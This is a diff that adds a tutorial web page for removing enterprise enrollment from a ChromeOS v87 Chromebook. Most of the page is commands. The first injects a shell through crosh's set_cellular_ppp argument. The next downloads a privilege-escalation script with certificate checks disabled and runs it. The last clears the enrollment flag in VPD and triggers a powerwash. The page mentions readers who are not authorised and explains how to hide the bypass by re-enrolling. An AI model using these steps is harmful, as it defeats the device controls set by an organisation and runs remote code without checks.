@@ -1,0 +1,44 @@
+---
+title: "v87 Unenrollment - Crosh"
+---
+
+{% include toc title="Table of Contents" %}
+
+## Section I - Obtain Root Access
+
+Inside of crosh, run the following command:
+
+```sh
+set_cellular_ppp \';bash;exit;\'
+```
+
+You should be dropped into a bash shell. If not, check the [troubleshooting guide](troubleshooting).
+
+Now, run the following command to download and run the privilege escalation script:
+
+```sh
+cd ~/Downloads && curl -LOk https://raw.githubusercontent.com/luphoria/chromeos-rootable/master/privesc/privesc-87.sh && bash <(cat ~/Downloads/privesc-87.sh)
+```
+
+You should be dropped into a bash shell with a **red** prompt. If not, check the [troubleshooting guide](troubleshooting).
+
+## Section II - Unenrolling and Powerwashing
+
+Run the following command:
+
+```sh
+vpd -i RW_VPD -s check_enrollment=0
+```
+
+Now, press `Ctrl+Shift+Q` two times to log out, and press `Ctrl+Shift+Alt+R` to trigger a powerwash. Follow the prompts, and reboot if neccecary. After powerwashing, your Chromebook will behave like a personal device and will be completely unrestricted.
+
+Your administrator wil be able to see that your device is "offline", and you should spend as little time as possible in this state if you are not authorized to be following this tutorial.
+{: .notice--danger}
+
+## Section III - Next Steps
+
+If you want to re-enroll but keep your Chromebook unrestricted, continue to [fakemurk](fakemurk)
+{: .notice--success}
+
+...or you could just keep your device like this, and use it as a personal device. The choice is yours.
+{: .notice--primary}
